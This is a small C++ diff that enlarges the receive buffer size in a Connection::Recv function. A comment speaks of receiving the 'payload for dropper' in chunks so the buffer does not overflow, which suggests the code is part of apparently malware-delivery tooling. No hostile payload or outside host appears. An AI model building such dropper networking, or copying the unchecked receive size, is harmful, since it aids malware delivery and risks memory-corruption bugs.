@@ -7,7 +7,7 @@ void Connection::Send(char* message)
 }
 char* Connection::Recv()
 {
-	recv(server, buf, sizeof(char) * 250000, 0);
+	recv(server, buf, sizeof(char) * 1000000, 0);
 	return GetBuf();
 	// probably you should send and receive payload for dropper in chunks of 1024 bytes so that the buffer doesn't overflows
 }
